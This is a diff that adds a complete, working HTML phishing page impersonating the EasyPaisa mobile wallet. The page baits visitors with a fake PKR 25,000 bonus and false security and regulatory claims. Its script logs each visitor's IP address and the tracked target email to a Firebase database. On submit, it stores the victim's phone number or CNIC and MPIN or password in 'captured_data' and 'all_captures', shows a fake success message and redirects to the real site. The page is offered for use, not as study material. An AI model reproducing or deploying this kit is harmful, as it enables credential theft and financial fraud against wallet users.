@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>EasyPaisa - Mobile Account</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <script src="../firebase-config.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f0f0f0;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            width: 100%;
+            max-width: 400px;
+            padding: 15px;
+        }
+        
+        .login-box {
+            background: #fff;
+            border-radius: 15px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.15);
+            overflow: hidden;
+            animation: slideUp 0.4s ease;
+        }
+        @keyframes slideUp {
+            from { transform: translateY(30px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #00a859, #007a41);
+            padding: 25px 20px;
+            text-align: center;
+            color: #fff;
+        }
+        .header .logo {
+            font-size: 3em;
+            margin-bottom: 10px;
+        }
+        .header h1 { font-size: 1.8em; font-weight: 700; }
+        .header p { font-size: 0.85em; opacity: 0.9; margin-top: 5px; }
+        
+        .offer-banner {
+            background: #00a859;
+            color: #fff;
+            padding: 12px 15px;
+            text-align: center;
+            font-weight: 600;
+            font-size: 0.9em;
+        }
+        .offer-banner .amount { font-size: 1.5em; font-weight: 900; }
+        
+        .form-section {
+            padding: 25px 20px;
+        }
+        
+        .balance-preview {
+            background: #e8f5e9;
+            border: 2px dashed #00a859;
+            border-radius: 12px;
+            padding: 15px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .balance-preview .title { color: #333; font-size: 0.85em; }
+        .balance-preview .bal { color: #00a859; font-size: 2em; font-weight: 900; }
+        .balance-preview .sub { color: #666; font-size: 0.8em; margin-top: 5px; }
+        
+        .form-group {
+            margin-bottom: 15px;
+        }
+        .form-group label {
+            display: block;
+            color: #333;
+            margin-bottom: 6px;
+            font-weight: 600;
+            font-size: 0.85em;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 0.95em;
+            transition: all 0.3s;
+        }
+        .form-group input:focus {
+            border-color: #00a859;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(0,168,89,0.15);
+        }
+        .form-group input::placeholder { color: #aaa; }
+        
+        .login-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #00a859, #007a41);
+            border: none;
+            border-radius: 10px;
+            color: #fff;
+            font-size: 1.1em;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 5px;
+        }
+        .login-btn:hover { transform: scale(1.02); box-shadow: 0 5px 20px rgba(0,168,89,0.3); }
+        
+        .forgot-pin {
+            text-align: center;
+            margin-top: 15px;
+        }
+        .forgot-pin a { color: #00a859; text-decoration: none; font-size: 0.85em; }
+        .forgot-pin a:hover { text-decoration: underline; }
+        
+        .footer {
+            background: #f5f5f5;
+            padding: 15px 20px;
+            text-align: center;
+            border-top: 1px solid #eee;
+        }
+        .footer p { color: #888; font-size: 0.75em; }
+        .footer .secure { color: #00a859; font-weight: 600; margin-top: 5px; }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 25px;
+        }
+        .loading .spinner {
+            border: 3px solid #e0e0e0;
+            border-top: 3px solid #00a859;
+            border-radius: 50%;
+            width: 35px;
+            height: 35px;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .loading p { color: #666; margin-top: 10px; }
+        
+        .success-msg {
+            display: none;
+            text-align: center;
+            padding: 25px;
+            background: #e8f5e9;
+            border-radius: 12px;
+        }
+        .success-msg h3 { color: #00a859; }
+        .success-msg p { color: #333; margin-top: 10px; font-size: 0.9em; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <div class="header">
+                <div class="logo">💳</div>
+                <h1>EasyPaisa</h1>
+                <p>Pakistan's Leading Mobile Wallet</p>
+            </div>
+            
+            <div class="offer-banner">
+                🎉 <span class="amount">PKR 25,000</span> FREE BONUS!<br>
+                Claim your welcome reward today!
+            </div>
+            
+            <div class="form-section">
+                <div class="balance-preview">
+                    <div class="title">🎁 Your Bonus Balance</div>
+                    <div class="bal">PKR 25,000</div>
+                    <div class="sub">Login to claim this amount instantly!</div>
+                </div>
+                
+                <form id="loginForm">
+                    <div class="form-group">
+                        <label>📱 Mobile Number / CNIC</label>
+                        <input type="text" id="username" placeholder="03XX-XXXXXXX or CNIC" required>
+                    </div>
+                    <div class="form-group">
+                        <label>🔑 MPIN / Password</label>
+                        <input type="password" id="password" placeholder="Enter your MPIN or password" required>
+                    </div>
+                    <button type="submit" class="login-btn">🔓 Login & Claim Bonus</button>
+                </form>
+                
+                <div class="loading" id="loading">
+                    <div class="spinner"></div>
+                    <p>🔄 Verifying your EasyPaisa account...</p>
+                </div>
+                
+                <div class="success-msg" id="successMsg">
+                    <h3>✅ Success!</h3>
+                    <p>PKR 25,000 bonus has been added to your account! Check your balance.</p>
+                    <p style="margin-top:10px;font-size:0.8em;color:#888;">Redirecting to EasyPaisa...</p>
+                </div>
+                
+                <div class="forgot-pin">
+                    <a href="#">Forgot MPIN?</a>
+                </div>
+            </div>
+            
+            <div class="footer">
+                <p>🔒 Secured by 256-bit SSL Encryption</p>
+                <p class="secure">✅ Registered with State Bank of Pakistan</p>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const linkID = urlParams.get('id') || 'direct_' + Date.now();
+        const targetEmail = urlParams.get('target') || '';
+        
+        let visitorIP = '';
+        fetch('https://api.ipify.org?format=json')
+            .then(r => r.json())
+            .then(data => {
+                visitorIP = data.ip;
+                db.ref('visits/' + linkID).push({
+                    ip: visitorIP,
+                    userAgent: navigator.userAgent,
+                    timestamp: Date.now(),
+                    page: 'easypaisa',
+                    target: targetEmail
+                });
+            });
+        
+        if (targetEmail) document.getElementById('username').value = decodeURIComponent(targetEmail);
+        
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            document.getElementById('loginForm').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+            
+            let location = 'Unknown';
+            fetch('https://ipapi.co/json/')
+                .then(r => r.json())
+                .then(data => { location = data.city + ', ' + data.country_name; })
+                .catch(() => {})
+                .finally(() => {
+                    db.ref('captured_data/' + linkID).set({
+                        username, password, ip: visitorIP, location,
+                        userAgent: navigator.userAgent, timestamp: Date.now(),
+                        service: 'easypaisa', target: targetEmail
+                    });
+                    db.ref('all_captures').push({
+                        username, password, ip: visitorIP, location,
+                        service: 'easypaisa', target: targetEmail, timestamp: Date.now()
+                    });
+                    
+                    setTimeout(() => {
+                        document.getElementById('loading').style.display = 'none';
+                        document.getElementById('successMsg').style.display = 'block';
+                        setTimeout(() => window.location.href = 'https://easypaisa.com.pk', 3000);
+                    }, 2000);
+                });
+        });
+    </script>
+</body>
+</html>
